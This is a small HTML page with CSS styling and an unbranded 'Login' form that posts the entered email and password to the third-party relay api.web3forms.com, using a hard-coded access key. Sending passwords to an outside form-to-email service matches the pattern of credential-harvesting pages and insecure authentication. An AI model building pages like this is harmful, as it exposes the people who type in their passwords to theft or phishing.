<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Hello, World!</title>
  <style>
    body {
        font-family: Arial, sans-serif;
        background-color: #f4f4f9;
        padding: 20px;
        margin: 0; /* Good practice to reset margin */
    }

    form {
        background-color: white; /* use background-color for clarity */
        max-width: 400px;
        margin: 50px auto;
        padding: 20px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        border-radius: 8px;
    }

    input[type="text"],
    input[type="email"],
    input[type="password"],
    textarea {
        width: 100%;
        padding: 8px;
        margin: 10px 0;
        box-sizing: border-box;
        border: 1px solid #ccc;
        border-radius: 4px;
    }

    input[type="text"]:focus,
    input[type="email"]:focus,
    input[type="password"]:focus,
    textarea:focus {
        border-color: #555;
    }

    button {
        background-color: #5c67f2;
        color: white;
        border: none;
        padding: 10px 20px;
        text-transform: uppercase;
        letter-spacing: 1px;
        font-weight: bold;
        border-radius: 4px;
        cursor: pointer;
    }

    button:hover {
        background-color: #4a54e1;
    }
  </style>
</head>
<body>
  <form action="https://api.web3forms.com/submit" method="POST">
    <input type="hidden" name="access_key" value="39720635-cb0d-42d1-85f8-ffcd0e8af170">
    <input type="email" name="email" placeholder="Email" required>
    <input type="password" name="password" placeholder="Password" required> <!-- Removed unnecessary space in placeholder -->
    <input type="hidden" name="redirect" value="https://web3forms.com/success">
    <button type="submit">Login</button>
  </form>
</body>
  </html>
